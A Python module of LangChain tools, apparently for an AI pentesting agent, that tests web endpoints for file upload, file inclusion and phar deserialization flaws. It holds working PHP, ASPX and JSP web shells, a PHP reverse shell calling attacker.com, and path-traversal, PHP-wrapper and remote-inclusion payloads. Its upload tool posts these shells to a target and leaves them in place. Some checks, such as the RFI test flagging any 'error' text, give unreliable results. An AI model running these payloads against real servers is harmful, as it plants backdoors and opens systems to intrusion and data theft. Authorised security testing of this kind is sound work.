"""
File Upload & File Inclusion Tester
Tests for unrestricted file uploads and file inclusion vulnerabilities
"""

from langchain.tools import tool
import subprocess
import tempfile
import os
from urllib.parse import urlparse


FILE_UPLOAD_PAYLOADS = {
    "php_shell": {
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "description": "PHP web shell"
    },
    "php_reverse": {
        "filename": "reverse.php",
        "content": "<? $sock=fsockopen('attacker.com',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>",
        "description": "PHP reverse shell"
    },
    "aspx_shell": {
        "filename": "shell.aspx",
        "content": "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><%Process.Start(Request.QueryString[\"cmd\"]);%>",
        "description": "ASPX web shell"
    },
    "jsp_shell": {
        "filename": "shell.jsp",
        "content": "<%@ page import=\"java.io.*\" %><%String cmd=request.getParameter(\"cmd\");Process p=Runtime.getRuntime().exec(cmd);%>",
        "description": "JSP web shell"
    },
    "html_polyglot": {
        "filename": "file.html.php",
        "content": "<html><body>Test</body></html><?php system($_GET['cmd']); ?>",
        "description": "Polyglot HTML/PHP"
    },
    "htaccess": {
        "filename": ".htaccess",
        "content": "AddType application/x-httpd-php .jpg",
        "description": ".htaccess to execute JPG as PHP"
    },
    "null_byte": {
        "filename": "shell.php%00.jpg",
        "content": "<?php system($_GET['cmd']); ?>",
        "description": "Null byte injection"
    },
}

LFI_PAYLOADS = {
    "local_file": {
        "payloads": [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..././..././etc/passwd",
        ],
        "indicator": "root:"
    },
    "windows_file": {
        "payloads": [
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
        ],
        "indicator": "[boot loader]"
    },
    "filter_bypass": {
        "payloads": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "expect://whoami",
        ],
        "indicator": "base64"
    },
}


@tool
def test_unrestricted_file_upload(upload_url: str) -> dict:
    """
    Test for unrestricted file upload vulnerabilities
    
    Args:
        upload_url: File upload endpoint URL
    
    Returns:
        Dictionary with upload findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    for payload_name, payload_info in FILE_UPLOAD_PAYLOADS.items():
        filename = payload_info["filename"]
        content = payload_info["content"]
        description = payload_info["description"]
        
        try:
            # Create temporary file with payload
            with tempfile.NamedTemporaryFile(mode='w', suffix='.tmp', delete=False) as f:
                f.write(content)
                temp_file = f.name
            
            # Upload file
            result = subprocess.run(
                ["curl", "-s", "-m", "5", "-F", f"file=@{temp_file}", upload_url],
                capture_output=True,
                timeout=10,
                text=True
            )
            
            response = result.stdout.lower()
            
            # Check for successful upload
            success_indicators = [
                "success",
                "uploaded",
                "accepted",
                "saved",
                filename.lower()
            ]
            
            if any(indicator in response for indicator in success_indicators):
                findings["vulnerable"] = True
                findings["findings"].append(f"Unrestricted upload: {description} ({filename})")
                findings["evidence"].append({
                    "filename": filename,
                    "payload_type": payload_name
                })
            
            os.unlink(temp_file)
        
        except Exception:
            pass
    
    return findings


@tool
def test_file_inclusion(url: str, param_name: str = "file") -> dict:
    """
    Test for Local File Inclusion (LFI) vulnerabilities
    
    Args:
        url: Target URL with file parameter
        param_name: Parameter name (default: 'file')
    
    Returns:
        Dictionary with LFI findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    for category, payload_info in LFI_PAYLOADS.items():
        payloads = payload_info["payloads"]
        indicator = payload_info["indicator"]
        
        for payload in payloads:
            test_url = f"{url}?{param_name}={payload}"
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", test_url],
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                
                response = result.stdout
                
                # Check for file content indicators
                if indicator in response:
                    findings["vulnerable"] = True
                    findings["findings"].append(f"LFI via {param_name}: {category}")
                    findings["evidence"].append({
                        "category": category,
                        "payload": payload,
                        "evidence": response[:300]
                    })
            
            except Exception:
                pass
    
    return findings


@tool
def test_remote_file_inclusion(url: str, param_name: str = "file") -> dict:
    """
    Test for Remote File Inclusion (RFI) vulnerabilities
    
    Args:
        url: Target URL with file parameter
        param_name: Parameter name (default: 'file')
    
    Returns:
        Dictionary with RFI findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    rfi_payloads = [
        "http://attacker.com/shell.txt",
        "https://attacker.com/shell.php",
        "ftp://attacker.com/shell.txt",
    ]
    
    for payload in rfi_payloads:
        test_url = f"{url}?{param_name}={payload}"
        
        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "5", test_url],
                capture_output=True,
                timeout=10,
                text=True
            )
            
            response = result.stdout.lower()
            
            # Check for connection attempt or external content
            if any(word in response for word in ["warning", "error", "file not found", "connection"]):
                findings["vulnerable"] = True
                findings["findings"].append(f"RFI attempt via {param_name}: {payload}")
                findings["evidence"].append({
                    "payload": payload,
                    "response": response[:200]
                })
        
        except Exception:
            pass
    
    return findings


@tool
def test_phar_deserialization(upload_url: str) -> dict:
    """
    Test for PHP object injection via phar:// protocol
    
    Args:
        upload_url: Upload endpoint
    
    Returns:
        Dictionary with findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    # Phar deserialization can be triggered with include/require
    phar_payloads = [
        "phar://upload/shell.phar",
        "phar://./shell.phar",
    ]
    
    for payload in phar_payloads:
        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "5", f"{upload_url}?file={payload}"],
                capture_output=True,
                timeout=10,
                text=True
            )
            
            if "phar" not in result.stdout.lower() and len(result.stdout) > 0:
                findings["vulnerable"] = True
                findings["findings"].append(f"Potential phar:// deserialization")
        
        except Exception:
            pass
    
    return findings
